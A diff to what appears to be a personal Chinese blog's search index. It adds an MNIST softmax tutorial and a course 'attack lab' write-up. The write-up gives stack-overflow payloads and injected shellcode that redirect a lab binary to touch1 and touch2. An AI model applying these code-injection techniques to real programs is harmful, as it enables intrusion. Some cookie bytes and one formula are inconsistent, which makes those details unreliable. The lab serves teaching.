@@ -3,6 +3,77 @@
   
     
     <entry>
+      <title><![CDATA[MNIST]]></title>
+      <url>/2019/10/30/MNIST/</url>
+      <content type="html"><![CDATA[<h1 id="MNIST-机器学习入门"><a href="#MNIST-机器学习入门" class="headerlink" title="MNIST 机器学习入门"></a>MNIST 机器学习入门</h1><p>主要参考 : <a href="http://www.tensorfly.cn/tfdoc/tutorials/mnist_beginners.html" target="_blank" rel="noopener">tensorflow 中文社区</a></p>
+<a id="more"></a>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MNIST是一个入门级的计算机视觉数据集，它包含各种手写数字图片:</p>
+<figure class="image-box">
+                <img src="http://www.tensorfly.cn/tfdoc/images/MNIST.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>在此教程中，我们将训练一个机器学习模型用于预测图片里面的数字.</p>
+<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>数据集的下载和安装本来可以用 tensorflow 社区提供的一份python代码来完成. 可惜链接是指向google 的网盘的, 我手上暂时也没可用的梯子, 只好百度了一份 <code>input_data.py</code>, 然而这份代码年代已经十分久远, 已经不适合现在版本的numpy了, 所以我又只能下载安装一份旧的numpy <code>pip install numpy==1.16.0</code>. But 又因为在国内连接<code>pypi</code>也十分的慢, socket会报 <code>time out</code> 错误, 我又只能换了下<code>douban</code>的镜像<code>pip install redis -i https://pypi.douban.com/simple</code>. 这下才算解决了数据集的问题(苦笑).</p>
+<p>在使用中, 需要把<code>input_data.py</code>先<code>import</code>进 python 的主程序中, 如果数据集没有被提前下载, 那么在运行时会调用<code>input_data</code>中的函数下载数据集. 建议先提前下载好数据集放置在固定的目录下, 可以避免运行时下载速度太慢的问题.</p>
+<p>实际使用中的数据集会被分为两部分, 60000行的训练数据集(mnist.train)和10000行的测试数据集(mnist.test). 有了这个单独用来测试而不会用于训练的数据集会使模型更容易推广到其他数据集上(泛化).</p>
+<p>而每一组数据单元包含一个手写图片和一个对应的标签的数据. 所有图片的数据可以由一个形状为<code>[60000, 784]</code>的张量来表示, 第一个维度当做图片的索引. 所有标签的数据用张量<code>[60000,10]</code>来表示. 且此处的10维向量是独热的, 代表 0 - 9 十种可能.</p>
+<h2 id="softmax回归"><a href="#softmax回归" class="headerlink" title="softmax回归"></a>softmax回归</h2><p>目标: 求得每个像素对于特定数字类的权值, 即得到一张给定图片属于某个特定数字类的证据(evidence), 证据值越大, 证明越有可能是这个数字类. </p>
+<p>对于给定的输入图片 x 它代表的是数字 i 的证据可以表示为:<br>$$<br>evidence_i = \sum_j W_{i,j} + b_i<br>$$<br>其中$W_i$ 代表权重, $b_i$代表数字 i 类的偏置量, j 代表给定图片 x 的像素索引用于像素求和. 然后用softmax函数可以把这些证据转换成概率 y:<br>$$y = softmax(evidence)$$</p>
+<p>可以看成是一个激励(activation)函数, 把我们定义的线性函数的输出转换成我们想要的格式, 也就是关于10个数字类的概率分布.</p>
+<p>$$<br>\begin{aligned}<br>softmax(x) &amp;= normalize(exp(x)) \<br>softmax(x)_i &amp;= \cfrac{exp(x_i)}{\Sigma_jexp(x_j)}<br>\end{aligned}<br>$$</p>
+<p>此处的<code>normalize()</code>为归一化, 归一化就是要把需要处理的数据经过处理后(通过某种算法)限制在你需要的一定范围内, 可以方便后面数据处理的方便, 其次是保证程序运行时的概率分布.</p>
+<p>回归模型可以用下面的图解释:</p>
+<figure class="image-box">
+                <img src="http://www.tensorfly.cn/tfdoc/images/softmax-regression-scalargraph.png" alt title class>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <img src="http://www.tensorfly.cn/tfdoc/images/softmax-regression-scalarequation.png" alt title class>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <img src="http://www.tensorfly.cn/tfdoc/images/softmax-regression-vectorequation.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>第三张图的 W 矩阵即为权重值矩阵. 此处矩阵相乘的形式与下面 tf 的代码十分相似.</p>
+<figure class="image-box">
+                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/dachuang/matrix1.png" alt title class>
+                <p></p>
+            </figure>
+<p>这里公式其实是单就一张图片而言. x1,x2,x3代表了 x 的第 1,2,3 个像素. 将矩阵乘法展开后就成了加权求和的形式. 不过在实际中, 图片是有 784 个像素的, 输出的向量元素个数也应该为10, 所以严格来说公式应该是这个样子.</p>
+<figure class="image-box">
+                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/dachuang/matrix2.png" alt title class>
+                <p></p>
+            </figure>
+<p>目前为止这个模型的思想似乎很清晰了, 但是 <code>softmax 回归</code> 在这里究竟是什么作用还是有些不明朗, 不过我大致猜测其实 softmax 与模型参数 W 和 b 的确定并没有太大的关系, 它在这里主要的作用是将计算结果映射到 [0,1] 的区间上, 使结果作为概率值是有意义的. 在神经网络上, softmax 也是作用在最后一层. 综上, softmax 的作用是对模型输出的一层 “约束”.</p>
+<h2 id="模型设定"><a href="#模型设定" class="headerlink" title="模型设定"></a>模型设定</h2><p>我所理解的模型设定这部分就是使用 tensorflow 的语言描述出数学模型的公式的过程. 这里所需要描述的公式如上图所示.</p>
+<p>根据公式, 我们在代码中需要实现的有 tensorflow变量 x 和 y分别用来存储输入的数据和模型输出的数据, 并且还有 权重矩阵W 和 偏置量b.<br>还需要在程序中设定好使用的模型为 <code>softmax 回归</code>.</p>
+<h2 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h2><p>交叉熵(cross-entropy)成本函数.<br>$$<br>H_{y’}(y) = -\sum_i y^{‘}_ilog(y_i)<br>$$<br>其中 y 是预测的概率分布, y’ 是实际的分布(输入的 one-hot vector, 这里输入为独热的向量也是为了和模型的输出的形式相同.).</p>
+<p>交叉熵代表了模型计算结果中的损失(loss), 也就是说交叉熵越大, 那么计算结果的误差也就越大.</p>
+<p>代码中要求TensorFlow用梯度下降算法以 0.01 的学习速率最小化交叉熵. 使用随机梯度的下降训练的意义在于, 在每一步训练时不使用所有的数据, 而是选取其中的子集来节省计算的开销. 在每一步的计算中, tensorflow 会自动使用反向传播算法(backpropagation algorithm)来不断降低 loss 的值. 我在网上找到了反向传播算法的介绍, 其原理大致为 : 当输入的数据集相同时, 损失函数的值 C 可以看做是关于 权重矩阵W 和 偏置量b 的二元函数. 也就是 $C = f(W,b)$, 当 C 的值最小时, 周围的函数是平滑的(也有不是的情况), 也就相当于偏导数为 0.<br>$$<br>\begin{aligned}<br>&amp;\cfrac{\partial C}{\partial W} = 0 \<br>&amp;\cfrac{\partial C}{\partial b} = 0<br>\end{aligned}<br>$$<br>经过多轮迭代使参数 W 和 b 达到接近这样的状态时, 梯度下降的一步就完成了. 但是具体每步的步长是多少要根据学习速率和步长来计算.</p>
+<h2 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h2><p>模型评估的方法比较简单, 就是用 minst.test 中的数据, 将图片的数据输入到训练好的模型中, 然后调用 tf 中的函数与标签中的结果进行比对算出正确率. 这里的 test 数据应该与 train 中的数据不能有重合.</p>
+<h2 id="完整代码和我的注释"><a href="#完整代码和我的注释" class="headerlink" title="完整代码和我的注释"></a>完整代码和我的注释</h2><p>input_data.py 可以在百度上搜到, 就不贴在这里了.</p>
+<p>MNIST.py</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> input_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 input_data.py 中的代码导入需要的数据集</span></span><br><span class="line">mnist = input_data.read_data_sets(<span class="string">"MNIST_data/"</span>, one_hot=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###  模型构建  ####</span></span><br><span class="line">x = tf.placeholder(<span class="string">"float"</span>, [<span class="literal">None</span>, <span class="number">784</span>])</span><br><span class="line">W = tf.Variable(tf.zeros([<span class="number">784</span>,<span class="number">10</span>])) <span class="comment"># W 权重矩阵</span></span><br><span class="line">b = tf.Variable(tf.zeros([<span class="number">10</span>]))     <span class="comment"># b 偏置量</span></span><br><span class="line">y = tf.nn.softmax(tf.matmul(x,W)+b) <span class="comment"># y 输出值, 同时指出了模型为 softmax</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 训练模型以及评估 ####</span></span><br><span class="line">y_ = tf.placeholder(<span class="string">"float"</span>,[<span class="literal">None</span>,<span class="number">10</span>])         <span class="comment"># y_</span></span><br><span class="line">cross_entropy = -tf.reduce_sum(y_*tf.log(y))   <span class="comment"># 交叉熵, 符合上面的交叉熵公式 </span></span><br><span class="line">train_step = tf.train.GradientDescentOptimizer(<span class="number">0.01</span>).minimize(cross_entropy) <span class="comment"># 使用随机梯度下降算法最小化交叉熵</span></span><br><span class="line">init = tf.global_variables_initializer()</span><br><span class="line">sess = tf.Session()  <span class="comment"># sess 为 session, tf 中一切 Variable 的操作都需要用session 来控制</span></span><br><span class="line">sess.run(init)       <span class="comment"># 初始化后所有的 Variable 才能使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">  <span class="comment"># 随机抓取 100 组数据作为一次训练的数据集. 再迭代训练 1000 次, 这样会利用上100_000组数据</span></span><br><span class="line">  batch_xs, batch_ys = mnist.train.next_batch(<span class="number">100</span>) </span><br><span class="line">  sess.run(train_step, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;)</span><br><span class="line"></span><br><span class="line">correct_prediction = tf.equal(tf.argmax(y,<span class="number">1</span>), tf.argmax(y_,<span class="number">1</span>)) <span class="comment"># 返回一组boolean值代表正确的预测</span></span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(correct_prediction, <span class="string">"float"</span>)) <span class="comment"># 将boolean值转为百分率</span></span><br><span class="line">print(sess.run(accuracy, feed_dict=&#123;x: mnist.test.images, y_: mnist.test.labels&#125;)) <span class="comment"># 输出正确率</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个 MNIST 的项目是 tensorflow中文社区 介绍的深度学习领域中的 “Hellowrold”, 用来练手应该是非常合适的, 这也是我第一次使用tensorflow. 被它的强大所震撼.(上面的代码样例实际运行时间不会超过 3 秒钟). 而且这个项目代表了机器学习中一个十分经典的问题 – 多分类问题. </p>
+<p>当读懂了教程后, 会发现整个项目的构建思路其实是无比清晰的, 从问题的数据集的数学表示, 到设计数学模型描述实际问题中数据的关系, 再到将数学模型用代码实现已经选择训练模型的策略和评估方法, 在思路上十分顺畅. 这种设计思路我觉得对将来我自己的项目十分有借鉴意义. 只可惜我的数学底子在浩瀚的数学公式面前显得实在是微不足道, 无法深入的探究数学公式的原理. 在这里立个flag, 寒假在学习深度学习和tensorflow时也要尽最大努力补充数学和概率论的知识, 只有这样才能从更底层的角度深入的理解深度学习.</p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> tensorflow </tag>
+            
+            <tag> 深度学习 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[一些有趣的实验]]></title>
       <url>/2019/10/03/linux%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%AE%9E%E9%AA%8C/</url>
       <content type="html"><![CDATA[<p>课上老师布置的一些实验的记录.</p>
@@ -352,6 +423,55 @@
 
 <p>排序后就是<code>3 4 5 6 1 2</code></p>
 <p>加上之前那 “7 减”的操作, 就成了<code>4 3 2 1 6 5</code>, 即为 password.</p>
+<h3 id="attack-lab"><a href="#attack-lab" class="headerlink" title="attack lab"></a>attack lab</h3><p>进行三次代码注入攻击!</p>
+<h4 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h4><p>目标: 通过<code>gets()</code>函数的栈溢出漏洞, 利用输入的字符串覆盖栈外的 <code>retaddr</code> 为某个地址, 使程序运行一段通常情况下不会执行的代码, 也就是<code>retaddr</code>所保存的新的地址值处的代码.  </p>
+<p>先用 IDA 查看栈的结构. <code>getbuf()</code>函数的反汇编伪代码为:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小细节, <code>char bur[]</code>后面标注的是<code>[rsp+0h] [rbp-28h]</code>这个内存范围. 也就是这片函数栈帧的2*16+8=40字节大小. 然而下标处却写的是32(字节). 还有8 byte 存放的是原先的 ebp 的值.</p>
+<p>此处的函数栈结构应为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">               +-----------------+</span><br><span class="line">               |     retaddr     |</span><br><span class="line">               +-----------------+</span><br><span class="line">               |    saved ebp    |</span><br><span class="line">        rbp -&gt; +-----------------+</span><br><span class="line">               |    buf[24:32]   |</span><br><span class="line">               |    buf[16:24]   |</span><br><span class="line">               |    buf[8:16]    |</span><br><span class="line">               |    buf[0:8]     |</span><br><span class="line">rbp-32, rsp -&gt; +-----------------+</span><br></pre></td></tr></table></figure>
+
+<p>如果要让数据溢出到<code>retaddr</code>, 需要构造<code>payload = &#39;a&#39;*32 + &#39;b&#39;*8 + targetaddr</code>. </p>
+<p>再查看下<code>touch1</code>的函数地址, 为<code>0x00 00 00 00 00 40 17 C0</code>. 考虑到大端序到小端序的转换应为<code>0x00 00 00 00 c0 17 40 00</code>. </p>
+<p>用<code>hex2raw</code>工具进行不可见字符的输入, 构造文本文件例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/*       &apos;a&apos;*32       */</span><br><span class="line">31 31 31 31  31 31 31 31 </span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">31 31 31 31  31 31 31 31</span><br><span class="line">/*       &apos;b&apos;*8        */</span><br><span class="line">65 65 65 65  65 65 65 65</span><br><span class="line">/*   target address   */</span><br><span class="line">c0 17 40 00  00 00 00 00</span><br><span class="line">/*        \n          */</span><br><span class="line">0a</span><br></pre></td></tr></table></figure>
+
+<p>跑一下, 没有问题.</p>
+<figure class="image-box">
+                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%24R%25S7Z%7BRVOR0MUSD0CHE8%40T.png" alt title class>
+                <p></p>
+            </figure>
+<h4 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h4><p>成功的流程应该 : </p>
+<ol>
+<li>在<code>getbuf()</code>中栈溢出.</li>
+<li>设置<code>$rdi</code>的值为cookie.</li>
+<li>跳转到<code>touch2()</code></li>
+<li>进入<code>if(true)</code>, 调用<code>validate()</code></li>
+</ol>
+<p>所以关键就是如何栈溢出后能设置寄存器的值, 并且再跳转到<code>touch2()</code></p>
+<p>解决的方法是注入指令代码: 通过把ret的地址值覆盖为栈顶的指针(也就是我们字符串的首地址), 能够让字符串(的二进制对应机器码)作为指令运行起来.</p>
+<p>先写出汇编语言 : </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x59b997fa, %rdi</span><br><span class="line">pushq   0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>然后 <code>objdump</code> 反汇编出字节码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:   48 c7 c7 fa 97 69 59    mov    $0x596997fa,%rdi</span><br><span class="line">7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>把这段字节码写入 payload 中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 </span><br><span class="line">68 ec 17 40 00 </span><br><span class="line">c3 </span><br><span class="line">31 31 31 </span><br><span class="line"></span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line">31 31 31 31</span><br><span class="line"></span><br><span class="line">65 65 65 65</span><br><span class="line">65 65 65 65 </span><br><span class="line"></span><br><span class="line">78 dc 61 55 </span><br><span class="line">00 00 00 00</span><br><span class="line">0a</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/attack_lab/%5DCQ%60UP2NYY%25%602U%29R8~Z5WMF.png" alt title class>
+                <p></p>
+            </figure>
+<ul>
+<li>一开始的错误思路 :<ul>
+<li>企图尝试直接插入能修改rip寄存器的代码实现跳转, 不成.</li>
+<li>误认为 ret 每次都会将同一内存地址的值赋值给$rip, 事实上因为pop弹出的是栈顶的值, 所以并非同一地址.</li>
+</ul>
+</li>
+</ul>
+<p>(未完待续…)</p>
 ]]></content>
       
         
@@ -401,9 +521,9 @@
         
         <tags>
             
-            <tag> python </tag>
-            
             <tag> misc </tag>
+            
+            <tag> python </tag>
             
         </tags>
         
